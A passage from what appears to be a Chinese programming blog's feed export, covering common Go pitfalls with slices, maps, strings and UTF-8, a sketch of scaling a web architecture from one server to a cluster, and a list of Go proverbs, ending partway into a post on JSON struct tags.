class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">(arr [3]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">7</span></span><br><span class="line">        fmt.Println(arr)    <span class="comment">// [7 2 3]</span></span><br><span class="line">    &#125;(x)</span><br><span class="line">    fmt.Println(x)            <span class="comment">// [1 2 3]    // 并不是你以为的 [7 2 3]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想修改参数数组：</p><ul><li>直接传递指向这个数组的指针类型：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传址会修改原数据</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">(arr *[3]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">        (*arr)[<span class="number">0</span>] = <span class="number">7</span>    </span><br><span class="line">        fmt.Println(arr)    <span class="comment">// &amp;[7 2 3]</span></span><br><span class="line">    &#125;(&amp;x)</span><br><span class="line">    fmt.Println(x)    <span class="comment">// [7 2 3]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>直接使用 slice：即使函数内部得到的是 slice 的值拷贝，但依旧会更新 slice 的原始数据（底层 array）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 会修改 slice 的底层 array，从而修改 slice</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">(arr []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">7</span></span><br><span class="line">        fmt.Println(x)    <span class="comment">// [7 2 3]</span></span><br><span class="line">    &#125;(x)</span><br><span class="line">    fmt.Println(x)    <span class="comment">// [7 2 3]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-range-遍历-slice-和-array-时混淆了返回值"><a href="#13-range-遍历-slice-和-array-时混淆了返回值" class="headerlink" title="13.range 遍历 slice 和 array 时混淆了返回值"></a>13.range 遍历 slice 和 array 时混淆了返回值</h3><p>与其他编程语言中的 for-in 、foreach 遍历语句不同，Go 中的 range 在遍历时会生成 2 个值，第一个是元素索引，第二个是元素的值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := []<span class="keyword">string</span>&#123;<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> v := <span class="keyword">range</span> x &#123;</span><br><span class="line">        fmt.Println(v)    <span class="comment">// 1 2 3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := []<span class="keyword">string</span>&#123;<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> x &#123;    <span class="comment">// 使用 _ 丢弃索引</span></span><br><span class="line">        fmt.Println(v)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="14-slice-和-array-其实是一维数据"><a href="#14-slice-和-array-其实是一维数据" class="headerlink" title="14.slice 和 array 其实是一维数据"></a>14.slice 和 array 其实是一维数据</h3><p>看起来 Go 支持多维的 array 和 slice，可以创建数组的数组、切片的切片，但其实并不是。</p><p>对依赖动态计算多维数组值的应用来说，就性能和复杂度而言，用 Go 实现的效果并不理想。</p><p>可以使用原始的一维数组、“独立“ 的切片、“共享底层数组”的切片来创建动态的多维数组。</p><p>1.使用原始的一维数组：要做好索引检查、溢出检测、以及当数组满时再添加值时要重新做内存分配。</p><p>2.使用“独立”的切片分两步：</p><ul><li><p>创建外部 slice</p><ul><li><p>对每个内部 slice 进行内存分配</p><p>注意内部的 slice 相互独立，使得任一内部 slice 增缩都不会影响到其他的 slice</p></li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用各自独立的 6 个 slice 来创建 [2][3] 的动态多维数组</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="number">2</span></span><br><span class="line">    y := <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    table := <span class="built_in">make</span>([][]<span class="keyword">int</span>, x)</span><br><span class="line">    <span class="keyword">for</span> i  := <span class="keyword">range</span> table &#123;</span><br><span class="line">        table[i] = <span class="built_in">make</span>([]<span class="keyword">int</span>, y)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.使用“共享底层数组”的切片</p><ul><li>创建一个存放原始数据的容器 slice</li><li>创建其他的 slice</li><li>切割原始 slice 来初始化其他的 slice</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    h, w := <span class="number">2</span>, <span class="number">4</span></span><br><span class="line">    raw := <span class="built_in">make</span>([]<span class="keyword">int</span>, h*w)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> raw &#123;</span><br><span class="line">        raw[i] = i</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化原始 slice</span></span><br><span class="line">    fmt.Println(raw, &amp;raw[<span class="number">4</span>])    <span class="comment">// [0 1 2 3 4 5 6 7] 0xc420012120 </span></span><br><span class="line"></span><br><span class="line">    table := <span class="built_in">make</span>([][]<span class="keyword">int</span>, h)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> table &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等间距切割原始 slice，创建动态多维数组 table</span></span><br><span class="line">        <span class="comment">// 0: raw[0*4: 0*4 + 4]</span></span><br><span class="line">        <span class="comment">// 1: raw[1*4: 1*4 + 4]</span></span><br><span class="line">        table[i] = raw[i*w : i*w + w]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(table, &amp;table[<span class="number">1</span>][<span class="number">0</span>])    <span class="comment">// [[0 1 2 3] [4 5 6 7]] 0xc420012120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更多关于多维数组的参考</p><ul><li><p><a href="https://stackoverflow.com/questions/39561140/how-is-two-dimensional-arrays-memory-representation" target="_blank" rel="noopener">go-how-is-two-dimensional-arrays-memory-representation</a></p></li><li><p><a href="https://stackoverflow.com/questions/39804861/what-is-a-concise-way-to-create-a-2d-slice-in-go" target="_blank" rel="noopener">what-is-a-concise-way-to-create-a-2d-slice-in-go</a></p></li></ul><h3 id="15-访问-map-中不存在的-key"><a href="#15-访问-map-中不存在的-key" class="headerlink" title="15.访问 map 中不存在的 key"></a>15.访问 map 中不存在的 key</h3><p>和其他编程语言类似，如果访问了 map 中不存在的 key 则希望能返回 nil，比如在 PHP 中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> php -r <span class="string">'$v = ["x"=&gt;1, "y"=&gt;2]; @var_dump($v["z"]);'</span></span></span><br><span class="line">NULL</span><br></pre></td></tr></table></figure><p>Go 则会返回元素对应数据类型的零值，比如 nil、’’ 、false 和 0，取值操作总有值返回，故不能通过取出来的值来判断 key 是不是在 map 中。</p><p>通常使用 comma ok 惯用法来判断 key 是否存在：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误的 key 检测方式</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;<span class="string">"one"</span>: <span class="string">"2"</span>, <span class="string">"two"</span>: <span class="string">""</span>, <span class="string">"three"</span>: <span class="string">"3"</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> v := x[<span class="string">"two"</span>]; v == <span class="string">""</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"key two is no entry"</span>)    <span class="comment">// 键 two 存不存在都会返回的空字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;<span class="string">"one"</span>: <span class="string">"2"</span>, <span class="string">"two"</span>: <span class="string">""</span>, <span class="string">"three"</span>: <span class="string">"3"</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> _, ok := x[<span class="string">"two"</span>]; !ok &#123;</span><br><span class="line">        fmt.Println(<span class="string">"key two is no entry"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-string-类型的值是常量，不可更改"><a href="#16-string-类型的值是常量，不可更改" class="headerlink" title="16.string 类型的值是常量，不可更改"></a>16.string 类型的值是常量，不可更改</h3><p>尝试使用索引遍历字符串，来更新字符串中的个别字符，是不允许的。</p><p>string 类型的值是只读的二进制 byte slice，如果真要修改字符串中的字符，将 string 转为 []byte 修改后，再转为 string 即可：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改字符串的错误示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="string">"text"</span></span><br><span class="line">    x[<span class="number">0</span>] = <span class="string">"T"</span>        <span class="comment">// error: cannot assign to x[0]</span></span><br><span class="line">    fmt.Println(x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="string">"text"</span></span><br><span class="line">    xBytes := []<span class="keyword">byte</span>(x)</span><br><span class="line">    xBytes[<span class="number">0</span>] = <span class="string">'T'</span>    <span class="comment">// 注意此时的 T 是 rune 类型</span></span><br><span class="line">    x = <span class="keyword">string</span>(xBytes)</span><br><span class="line">    fmt.Println(x)    <span class="comment">// Text</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意： 上边的示例并不是更新字符串的正确姿势，因为一个 UTF8 编码的字符可能会占多个字节，比如汉字就需要 <code>3~4</code>个字节来存储，此时更新其中的一个字节是错误的。</p><p>更新字串的正确姿势：将 string 转为 rune slice（此时 1 个 rune 可能占多个 byte），直接更新 rune 中的字符</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x := <span class="string">"text"</span></span><br><span class="line">    xRunes := []<span class="keyword">rune</span>(x)</span><br><span class="line">    xRunes[<span class="number">0</span>] = <span class="string">'我'</span></span><br><span class="line">    x = <span class="keyword">string</span>(xRunes)</span><br><span class="line">    fmt.Println(x)    <span class="comment">// 我ext</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-string-与-byte-slice-之间的转换"><a href="#17-string-与-byte-slice-之间的转换" class="headerlink" title="17.string 与 byte slice 之间的转换"></a>17.string 与 byte slice 之间的转换</h3><p>当进行 string 和 byte slice 相互转换时，参与转换的是拷贝的原始值。这种转换的过程，与其他编程语的强制类型转换操作不同，也和新 slice 与旧 slice 共享底层数组不同。</p><p>Go 在 string 与 byte slice 相互转换上优化了两点，避免了额外的内存分配：</p><ul><li>在 map[string] 中查找 key 时，使用了对应的 []byte，避免做 m[string(key)] 的内存分配</li><li>使用 for range 迭代 string 转换为 []byte 的迭代：for i,v := range []byte(str) {…}</li></ul><h3 id="18-string-与索引操作符"><a href="#18-string-与索引操作符" class="headerlink" title="18.string 与索引操作符"></a>18.string 与索引操作符</h3><p>对字符串用索引访问返回的不是字符，而是一个 byte 值。</p><p>这种处理方式和其他语言一样，比如 PHP 中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> php -r <span class="string">'$name="中文"; var_dump($name);'</span>    <span class="comment"># "中文" 占用 6 个字节</span></span></span><br><span class="line">string(6) "中文"</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> php -r <span class="string">'$name="中文"; var_dump($name[0]);'</span> <span class="comment"># 把第一个字节当做 Unicode 字符读取，显示 U+FFFD</span></span></span><br><span class="line">string(1) "�"    </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> php -r <span class="string">'$name="中文"; var_dump($name[0].$name[1].$name[2]);'</span></span></span><br><span class="line">string(3) "中"</span><br><span class="line">func main() &#123;</span><br><span class="line">    x := "ascii"</span><br><span class="line">    fmt.Println(x[0])        // 97</span><br><span class="line">    fmt.Printf("%T\n", x[0])// uint8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果需要使用 <code>for range</code> 迭代访问字符串中的字符（<code>unicode code point / rune</code>），标准库中有 <code>&quot;unicode/utf8&quot;</code> 包来做 <code>UTF8</code> 的相关解码编码。另外 <code>utf8string</code> 也有像 <code>func (s *String) At(i int) rune</code> 等很方便的库函数。</p><h3 id="19-字符串并不都是-UTF8-文本"><a href="#19-字符串并不都是-UTF8-文本" class="headerlink" title="19.字符串并不都是 UTF8 文本"></a>19.字符串并不都是 UTF8 文本</h3><p>string 的值不必是 UTF8 文本，可以包含任意的值。只有字符串是文字字面值时才是 UTF8 文本，字串可以通过转义来包含其他数据。</p><p>判断字符串是否是 UTF8 文本，可使用 “unicode/utf8” 包中的 ValidString() 函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    str1 := <span class="string">"ABC"</span></span><br><span class="line">    fmt.Println(utf8.ValidString(str1))    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">    str2 := <span class="string">"A\xfeC"</span></span><br><span class="line">    fmt.Println(utf8.ValidString(str2))    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">    str3 := <span class="string">"A\\xfeC"</span></span><br><span class="line">    fmt.Println(utf8.ValidString(str3))    <span class="comment">// true    // 把转义字符转义成字面值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="20-字符串的长度"><a href="#20-字符串的长度" class="headerlink" title="20.字符串的长度"></a>20.字符串的长度</h3><p>在 Python 中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data &#x3D; u&#39;♥&#39;  </span><br><span class="line">print(len(data)) # 1</span><br></pre></td></tr></table></figure><p>然而在 Go 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    char := <span class="string">"♥"</span></span><br><span class="line">    fmt.Println(<span class="built_in">len</span>(char))    <span class="comment">// 3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Go 的内建函数 len() 返回的是字符串的 byte 数量，而不是像 Python 中那样是计算 Unicode 字符数。</p><p>如果要得到字符串的字符数，可使用 “unicode/utf8” 包中的 RuneCountInString(str string) (n int)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    char := <span class="string">"♥"</span></span><br><span class="line">    fmt.Println(utf8.RuneCountInString(char))    <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意： RuneCountInString 并不总是返回我们看到的字符数，因为有的字符会占用 2 个 rune：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    char := <span class="string">"é"</span></span><br><span class="line">    fmt.Println(<span class="built_in">len</span>(char))    <span class="comment">// 3</span></span><br><span class="line">    fmt.Println(utf8.RuneCountInString(char))    <span class="comment">// 2</span></span><br><span class="line">    fmt.Println(<span class="string">"cafe\u0301"</span>)    <span class="comment">// café    // 法文的 cafe，实际上是两个 rune 的组合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.topgoer.com/%E8%B5%84%E6%96%99%E4%B8%8B%E8%BD%BD/Golang%E6%96%B0%E6%89%8B%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%B8%A9%E7%9A%8450%E4%B8%AA%E5%9D%91.html?h=%E5%9D%91" target="_blank" rel="noopener">Golang新手可能会踩的58个坑</a></li><li><a href="http://devs.cloudimmunity.com/gotchas-and-common-mistakes-in-go-golang/" target="_blank" rel="noopener">50 Shades of Go: Traps, Gotchas, and Common Mistakes for New Golang Devs</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何设计一个千万级架构</title>
      <link href="/how-to-design-a-tens-of-millions-of-architecture/"/>
      <url>/how-to-design-a-tens-of-millions-of-architecture/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来记录如何从单机一步步设计出支持百万级、千万级、亿级数据的架构。</p><a id="more"></a><h2 id="单机时代"><a href="#单机时代" class="headerlink" title="单机时代"></a>单机时代</h2><p>最开始的时候，用户量很少，一天就几百上千个请求，此时一台服务器就完全足够。</p><p>Java、Python、PHP或者其他后端语言开发一个Web后端服务，再用一个MySQL来存储业务数据，它俩携手工作，运行在同一台服务器上，对外提供服务。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221230153055.png" alt=""></p><p>随着数据量增加、访问量增加，MySQL 会出现查询变慢，Web 服务会出现访问变慢。</p><p>解决方案：</p><ul><li>创建索引和优化索引，解决查询变慢的问题。</li><li>增加 CDN（让静态资源不至于直接请求服务器）</li><li>增加服务器，使用 nginx 做负载均衡（分散单台压力）</li></ul><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>数据量还在继续增加，单台服务器已经不能满足需求了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221230153104.png" alt=""></p><p>解决方案：</p><ul><li>通过 Mysql binlog 实现主从复制</li><li>对不同用户创建不同读写权限，实现读写分离</li><li>分库分表</li></ul><h2 id="数据读写分离"><a href="#数据读写分离" class="headerlink" title="数据读写分离"></a>数据读写分离</h2><p>数据的压力继续增大，数据库仍然是瓶颈。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221230153114.png" alt=""></p><p>解决方案：</p><ul><li>引入缓存系统，可以有效缩短服务的响应时间</li></ul><h2 id="缓存系统"><a href="#缓存系统" class="headerlink" title="缓存系统"></a>缓存系统</h2><p>随着流量继续增加，业务逻辑会变得越来越复杂，代码也会越来越复杂。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221230153123.png" alt=""><br>解决方案：</p><ul><li>引入缓存系统，可以有效缩短服务的响应时间</li></ul><h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><p>此时设计到这里，已经完全可以支撑百万级的数据。</p><p>Mysql 天生适合海量的数据存储，不适合海量数据的查询，所以此时数据的查询就成了瓶颈。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221230153135.png" alt=""><br>解决方案：</p><ul><li>引入消息队列，异步、解藕、削峰</li></ul><h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221230153153.png" alt=""><br>解决方案：</p><ul><li>引入 ElasticSearch</li></ul><p>引入搜索引擎之后，还可以对架构进行优化。</p><h2 id="最后版本"><a href="#最后版本" class="headerlink" title="最后版本"></a>最后版本</h2><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221230153207.png" alt=""></p><p>上面就是从最简单的单机到复杂集群的高并发演进之路，架构设计到最后，做好集群的话，支持亿级的数据是没有问题的。</p><p>其中的搜索引擎，消息队列等都是可以替代的。</p><p>高可用、高并发、高性能是一个很大的话题，它所涵盖的东西其实不止上面这些内容，其中每一个模块拿出来都可以扩展出很多知识点。</p>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一些经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言之禅</title>
      <link href="/the-en-of-go/"/>
      <url>/the-en-of-go/</url>
      
        <content type="html"><![CDATA[<p>Go语言之禅</p><a id="more"></a><h2 id="Go-箴言"><a href="#Go-箴言" class="headerlink" title="Go 箴言"></a>Go 箴言</h2><ul><li>不要通过共享内存进行通信，通过通信共享内存</li><li>并发不是并行</li><li>管道用于协调；互斥量（锁）用于同步</li><li>接口越大，抽象就越弱</li><li>利用好零值</li><li>空接口 interface{} 没有任何类型约束</li><li>Gofmt 的风格不是人们最喜欢的，但 gofmt 是每个人的最爱</li><li>允许一点点重复比引入一点点依赖更好</li><li>系统调用必须始终使用构建标记进行保护</li><li>必须始终使用构建标记保护 Cgo</li><li>Cgo 不是 Go</li><li>使用标准库的 unsafe 包，不能保证能如期运行</li><li>清晰比聪明更好</li><li>反射永远不清晰</li><li>错误是值</li><li>不要只检查错误，还要优雅地处理它们</li><li>设计架构，命名组件，（文档）记录细节</li><li>文档是供用户使用的</li><li>不要（在生产环境）使用 panic()</li></ul><h2 id="Go-语言之禅"><a href="#Go-语言之禅" class="headerlink" title="Go 语言之禅"></a>Go 语言之禅</h2><ul><li>每个 package 实现单一的目的</li><li>显式处理错误</li><li>尽早返回，而不是使用深嵌套</li><li>让调用者处理并发（带来的问题）</li><li>在启动一个 goroutine 时，需要知道何时它会停止</li><li>避免 package 级别的状态</li><li>简单很重要</li><li>编写测试以锁定 package API 的行为</li><li>如果你觉得慢，先编写 benchmark 来证明</li><li>适度是一种美德</li><li>可维护性</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://the-zen-of-go.netlify.com/" target="_blank" rel="noopener">The Zen of Go</a></li><li><a href="https://go-proverbs.github.io/" target="_blank" rel="noopener">Go Proverbs</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习——json 结构体标签</title>
      <link href="/go-language-study-notes-json-structure-tag/"/>
      <url>/go-language-study-notes-json-structure-tag/</url>
      
        <content type="html"><![CDATA[<p>使用 Golang 时，经常需要创建结构体，而结构体经常需要被序列化或者反序列化，通常会在结构体的 field 类型后加上 json 结构体标签。</p><a id="more"></a><p>json 结构体标签，常见的关键字有 <code>omitempty</code> 和 <code>-</code>，下面一起来看一下，这几种的区别。</p><p>示例代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span 